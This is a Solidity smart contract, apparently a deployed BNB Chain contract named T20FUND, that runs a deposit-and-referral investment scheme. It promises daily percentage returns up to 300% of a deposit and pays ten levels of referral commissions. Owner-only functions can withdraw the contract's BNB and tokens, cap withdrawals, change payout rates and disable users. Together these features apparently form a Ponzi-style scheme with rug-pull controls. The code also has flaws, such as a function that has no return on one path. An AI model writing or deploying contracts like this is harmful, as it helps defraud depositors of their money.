/**
 *Submitted for verification at BscScan.com on 2021-12-22
*/

pragma solidity 0.5.10;
contract Owned {
    modifier onlyOwner() {
        require(msg.sender==owner);
        _;
    }
    
    address payable owner;
    function changeOwner(address payable _newOwner) public onlyOwner {
        require(_newOwner!=address(0));
        owner = _newOwner;
    }
    
}
interface AggregatorV3Interface {
  
  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
}

interface BuySellT20 {
  function getLatestPrice()external view returns(uint256);
  function tokenBuyingPrice(uint256 _numberOfTokens)view external returns(uint256);
  function bnbSellingPrice(uint256 _numberOfTokens)external view returns(uint256);
  function buyTokens(uint256 _numberOfTokens,address receiver,uint256 value) external returns(bool success);
  function sellTokens(uint256 _numberOfTokens)external returns(uint256);
  function usdtobnb()view external returns(uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external  returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

     function users(address userAddress) external view returns (bool active,
	    uint256 amount,
		uint256 withdrawn,
		uint256 start,
		address referrer,
		uint256 bonus,
		uint256 reffrals,
		uint256 DirectRef,
		uint256 depositNumber);
    function getUserPercentRate(uint256 plan) external view returns (uint256);
	function getUserLevels1(address userAddress) external view returns(uint256,uint256,uint256,uint256,uint256);
	function getUserLevels2(address userAddress) external view returns(uint256,uint256,uint256,uint256,uint256);
	function totalUsers() external view returns (uint256);
	function totalInvested() external view returns (uint256);
	function totalWithdrawn() external view returns (uint256);
	function totalDeposits() external view returns (uint256);
	function totalbought() external view returns (uint256);
	function totalsold() external view returns (uint256);
		function paid_users(address userAddress) external view returns (bool);
	


    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}


contract T20FUND{
	using SafeMath for uint256;
	AggregatorV3Interface public priceFeed;
	BuySellT20 public buyt20;
	IERC20 t20_address;
	IERC20 s_t20_address;
    address payable public owner;
	address payable public TokenAdd;
	uint256  public BASE_PERCENT = 10;
	uint256[10] public REFERRAL_PERCENTS = [300,200,100,100,100,50,50,50,30,20];
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	uint256 constant CONTRACT_BALANCE_STEP= 1000000 ether;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;	
     uint256 public BuyingPrice;
    uint256 public totalbought;
    uint256 public totalsold;
	uint256 withdraw_limit;
	struct User {
	    bool active;
	    uint256 amount;
		uint256 withdrawn;
		uint256 start;
		address referrer;
		uint256 bonus;
		uint256 reffrals;
		uint256 DirectRef;
		uint256 depositNumber;
		mapping(uint256=>uint256)  Level;
	}
	 mapping (address => bool) public paid_users;
	 mapping (address => bool) public synced_users;
	mapping (address => User) public users;
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    
    constructor(address _s_t20_address)public{
		s_t20_address=IERC20(_s_t20_address);
		owner=msg.sender;


        totalUsers=s_t20_address.totalUsers();
		totalDeposits=s_t20_address.totalDeposits();
		totalInvested=s_t20_address.totalInvested();
		totalWithdrawn=s_t20_address.totalWithdrawn();
		totalbought=s_t20_address.totalbought();
		totalsold=s_t20_address.totalsold();
     (bool active,uint256 amount,uint256 withdrawn,uint256 start,address referrer,uint256 bonus,uint256 reffrals,uint256 DirectRef,uint256 depositNumber)= s_t20_address.users(msg.sender);
    User storage user = users[msg.sender];
    users[msg.sender]=user;
		    user.active=active;
		    user.amount=amount;
		    user.withdrawn=withdrawn;
		    user.start=start;
		    user.referrer=address(0);
		    user.bonus=bonus;
		    user.reffrals=reffrals;
		    user.DirectRef=DirectRef;
		    user.depositNumber=depositNumber;
            users[owner].active=true;

	(uint256 l1,uint256 l2,uint256 l3,uint256 l4,uint256 l5)=s_t20_address.getUserLevels1(msg.sender);
	(uint256 l6,uint256 l7,uint256 l8,uint256 l9,uint256 l10)=s_t20_address.getUserLevels2(msg.sender);

	users[msg.sender].Level[1]=l1;
	users[msg.sender].Level[2]=l2;
	users[msg.sender].Level[3]=l3;
	users[msg.sender].Level[4]=l4;
	users[msg.sender].Level[5]=l5;
	users[msg.sender].Level[6]=l6;
	users[msg.sender].Level[7]=l7;
	users[msg.sender].Level[8]=l8;
	users[msg.sender].Level[9]=l9;
	users[msg.sender].Level[10]=l10;
	paid_users[msg.sender]=true;
	synced_users[msg.sender]=true;	
}


function setAdresses(address payable _tokenAdd,address b_t20,address _t20_address,address _s_t20_address,address _price_feed) public{
	require(msg.sender==owner,"No Access");
    TokenAdd=_tokenAdd;
    buyt20=BuySellT20(b_t20);
	t20_address=IERC20(_t20_address);
	s_t20_address=IERC20(_s_t20_address);
 
    //priceFeed = AggregatorV3Interface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);
	priceFeed=AggregatorV3Interface(_price_feed);
	
    
}
	function investT20(address referrer,uint256 _value) public payable  {

		if(!synced_users[msg.sender]){
             sync_user(1);
			 synced_users[msg.sender]=true;
		}
		 (,,,uint256 start,,,,,)= t20_address.users(msg.sender);
		 (,,,uint256 r_start,,,,,)= t20_address.users(referrer);
		  if(start>0){
			  require(paid_users[msg.sender],"Not paid sync fee");
		  }
		  
		  if(r_start>0)
			  require(paid_users[referrer],"Referer Not paid fee");
		
         
		 
		
        
		uint256 usd_value=buyt20.usdtobnb();
		require(msg.value>=_value,"invalid value");
 	require(msg.value>=uint256(50*usd_value) && msg.value<=uint256(1000*usd_value),"You have not fund ");
        require(!users[msg.sender].active,"you are active");
	    require(users[referrer].active,"refferer is not active");
	    require(referrer!=msg.sender,"reffer is msg.sender");
        User storage user = users[msg.sender];
		if(user.depositNumber>0){
		    users[msg.sender]=user;
		    user.active=true;
		    user.amount=_value.div(buyt20.bnbSellingPrice(1 ether)).mul(1e18);
		//    uint _v=0.1 ether;
		//    user.amount=(_value).div(_v);
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=user.referrer;
		    user.bonus=0;
		    user.reffrals=user.reffrals;
		    user.DirectRef=0;
		    user.depositNumber+=1;
		    
		}
		else{
		    users[msg.sender]=user;
		    user.active=true;
		    user.amount=_value.div(buyt20.bnbSellingPrice(1 ether)).mul(1e18);
		    user.withdrawn=0;
		    user.start=block.timestamp;
		    user.referrer=referrer;
		    user.bonus=0;
		    user.reffrals=0;
		    user.DirectRef=0;
		    user.depositNumber+=1;
		     
		  	address upline = user.referrer;
			
			for (uint256 i = 0; i < 11; i++) {
				if (upline != address(0)) {
				    if(i == 0){
						users[upline].Level[1] = users[upline].Level[1].add(1);	
					} else if(i == 1){
						users[upline].Level[2] = users[upline].Level[2].add(1);	
					} else if(i == 2){
						users[upline].Level[3] = users[upline].Level[3].add(1);	
					}
					 else if(i == 3){
						users[upline].Level[4] = users[upline].Level[4].add(1);	
					}
					 else if(i == 4){
						users[upline].Level[5] = users[upline].Level[5].add(1);	
					}
					 else if(i == 5){
						users[upline].Level[6] = users[upline].Level[6].add(1);	
					} else if(i == 6){
						users[upline].Level[7] = users[upline].Level[7].add(1);	
					} else if(i == 7){
						users[upline].Level[8] = users[upline].Level[8].add(1);	
					}
					 else if(i == 8){
						users[upline].Level[9] = users[upline].Level[9].add(1);	
					}
					else if(i == 9){
                        users[upline].Level[10] = users[upline].Level[10].add(1);	
                        }
					upline = users[upline].referrer;
				} else break;
			}
        users[user.referrer].reffrals+=1;
		users[user.referrer].DirectRef+=user.amount.mul(10).div(100);
	 	 		    
		}
	
	
	       TokenAdd.transfer(_value.mul(10).div(100));
		totalUsers=totalUsers.add(1);
		totalInvested = totalInvested.add(user.amount);
		totalDeposits = totalDeposits.add(1);
		emit NewDeposit(msg.sender, user.amount);

	}



	function withdraw() public {
        	if(!synced_users[msg.sender]){
             sync_user(1);
			 synced_users[msg.sender]=true;
		}
		 (,,,uint256 start,,,,,)= t20_address.users(msg.sender);
		  
		  if(start>0){
	          require(paid_users[msg.sender],"Not paid sync fee");
		  }
        
	
	    require(users[msg.sender].active,"you are not active");
	    require(block.timestamp>users[msg.sender].start,"Once in a day");
	    User storage user = users[msg.sender];
	    uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 bonuses= getUserReferralBonus(msg.sender);
		bonuses=bonuses.add(getUserDirectRef(msg.sender));
		uint256 dividends;
			if (user.withdrawn < (user.amount.mul(3000)).div(PERCENTS_DIVIDER)) {
					dividends = (user.amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.start))
						.div(TIME_STEP);
						
	if (users[msg.sender].referrer != address(0)) {
			address upline = users[msg.sender].referrer;
			if(isActive(upline)){
			   
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)){
				    if(users[upline].reffrals>i){
					uint256 amount = dividends.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
				    }
					upline = users[upline].referrer;
				}
				else break;
			  }
			}
		}
		if(bonuses>0){
		    
		
		dividends=dividends.add(bonuses);
		user.DirectRef=0;
		user.bonus=0;
		}

		if(dividends>withdraw_limit){
			dividends=withdraw_limit;
		}

				if (user.withdrawn.add(dividends) > (user.amount.mul(3000)).div(PERCENTS_DIVIDER)) {
					dividends = ((user.amount.mul(3000)).div(PERCENTS_DIVIDER)).sub(user.withdrawn);
					user.active=false;
				}
				user.withdrawn = user.withdrawn.add(dividends); 
			}
			
		t20_address.transferFrom(owner,msg.sender,dividends);
		totalWithdrawn = totalWithdrawn.add(dividends);
        user.start=block.timestamp;
		emit Withdrawn(msg.sender, dividends);
	}

	function getContractBalance() public view returns (uint256) {
             return (address(this).balance);
	
	}		

	
	function getContractBalanceRate() public view returns (uint256) {
		uint256 contractBalance = (address(this).balance);
		contractBalance=contractBalance.add(t20_address.balanceOf(address(this)));
		uint256 contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);
		if(contractBalancePercent>5){
		contractBalancePercent=5;
		}
		return BASE_PERCENT.add(contractBalancePercent);
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 contractBalanceRate = getContractBalanceRate();
		if (isActive(userAddress)) {
			uint256 timeMultiplier = (now.sub(user.start)).div(TIME_STEP.mul(7));
			if(timeMultiplier>5){
			 timeMultiplier=5;
			}
			return contractBalanceRate.add(timeMultiplier);
		} else {
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 userPercentRate = getUserPercentRate(userAddress);
		uint256 dividends;
		uint256 bonuses= getUserReferralBonus(userAddress);
		bonuses=bonuses.add(getUserDirectRef(userAddress));
			if (user.withdrawn < (user.amount.mul(300)).div(100)) {
					dividends = (user.amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.start))
						.div(TIME_STEP);
				}
				dividends=dividends.add(bonuses);
				if (user.withdrawn.add(dividends) > (user.amount.mul(300)).div(100)) {
					dividends = (user.amount.mul(300).div(100)).sub(user.withdrawn);
				}
		return (dividends);

	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
    function getUserDirectRef(address userAddress) public view returns(uint256) {
		return users[userAddress].DirectRef;
	}
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserDividends(userAddress);
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		
			if (user.withdrawn < user.amount.mul(300).div(100)) {
				return true;
			
		}
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256) {
	 	return (users[userAddress].reffrals);
	 	
	}
	function getUserLevels1(address userAddress)public view returns(uint256,uint256,uint256,uint256,uint256){
	    uint256 l1;
	    uint256 l2;
	    uint256 l3;
	    uint256 l4;
	    uint256 l5;
	    l1=users[userAddress].Level[1];
	    l2=users[userAddress].Level[2];
	    l3=users[userAddress].Level[3];
	    l4=users[userAddress].Level[4];
	    l5=users[userAddress].Level[5];
	    return (l1,l2,l3,l4,l5);
	}
	function getUserLevels2(address userAddress)public view returns(uint256,uint256,uint256,uint256,uint256){
	    uint256 l6;
	    uint256 l7;
	    uint256 l8;
	    uint256 l9;
	    uint256 l10;
	    l6=users[userAddress].Level[6];
	    l7=users[userAddress].Level[7];
	    l8=users[userAddress].Level[8];
	    l9=users[userAddress].Level[9];
	    l10=users[userAddress].Level[10];
	    return (l6,l7,l8,l9,l10);
	}

    function set_level_commisions(uint256[10] memory lvl_value) public returns(bool){
		require(msg.sender==owner,"Access Denied");
		for(uint i=0;i<=9;i++){
		
			REFERRAL_PERCENTS[i]=lvl_value[i];
		}
		return true;

	}
   

   function sync_user(uint8 _from) private{

   IERC20 t_address;
   if(_from==1){
	   t_address=s_t20_address;
   }
   else{
	   t_address=t20_address;
   }
	    (bool active,uint256 amount,uint256 withdrawn,uint256 start,address referrer,uint256 bonus,uint256 reffrals,uint256 DirectRef,uint256 depositNumber)= t_address.users(msg.sender);	
    User storage user1 = users[msg.sender];
    users[msg.sender]=user1;
		    user1.active=active;
		    user1.amount=amount;
		    user1.withdrawn=withdrawn;
		    user1.start=start;
		    user1.referrer=referrer;
		    user1.bonus=bonus;
		    user1.reffrals=reffrals;
		    user1.DirectRef=DirectRef;
		    user1.depositNumber=depositNumber;
            users[msg.sender].active=active;

	(users[msg.sender].Level[1],
	users[msg.sender].Level[2],
	users[msg.sender].Level[3],
	users[msg.sender].Level[4],
	users[msg.sender].Level[5])=t_address.getUserLevels1(msg.sender);
	(users[msg.sender].Level[6],
	users[msg.sender].Level[7],
	users[msg.sender].Level[8],
	users[msg.sender].Level[9],
	users[msg.sender].Level[10])=t_address.getUserLevels2(msg.sender);

	
	
  if(_from==1){
      
      paid_users[msg.sender]=t_address.paid_users(msg.sender);
  }
  
}
   
	function pay_sync_fee() public{
		require(!paid_users[msg.sender],"Already syncd");
		if(s_t20_address.paid_users(msg.sender))
        sync_user(1);
		else
		 sync_user(0);
		paid_users[msg.sender]=true;
		synced_users[msg.sender]=true;
	}

	

    
	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    
		return users[userAddress].amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    return users[userAddress].withdrawn;
	}

	
   
   
    function balBnb(uint256 _value) public returns(bool){
        require(msg.sender==owner,"access denied");
        owner.transfer(_value.mul(1e18));
        return true;
    } 

	  function balToken(uint256 _value)public returns(bool){
        require(msg.sender==owner);
        t20_address.transfer(owner,_value);
        return true;
    }

	 function set_withdraw_limit(uint256 _value) public{
		require(msg.sender==owner,"No Access");
        withdraw_limit=_value.mul(1e18);
    }

    function UpdateBase(uint256 _value) public{
		require(msg.sender==owner,"No Access");
        BASE_PERCENT=_value;
    }

	 function Update_paid_user(address userAddress) public{
		require(msg.sender==owner,"No Access");
        paid_users[userAddress]=true;
    }
  
	 function enable(address _address,bool status)public returns(bool){
        require(msg.sender==owner,"access denied");
        users[_address].active=status;
        return true;
    }
   
     
    
    function buyTokens(uint256 _numberOfTokens) public payable returns(bool success){
        require(_numberOfTokens>0, "token cannot be zero");
        buyt20.buyTokens(_numberOfTokens,msg.sender,msg.value);
        return true;
        
    }
    function sellTokens(uint256 _numberOfTokens)public returns(bool){
        require(t20_address.balanceOf(msg.sender)>=_numberOfTokens,"you have less tokens");
        t20_address.transferFrom(msg.sender,address(t20_address),_numberOfTokens);
        uint256 value=buyt20.sellTokens(_numberOfTokens);
        msg.sender.transfer(value);
       
        return true;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
}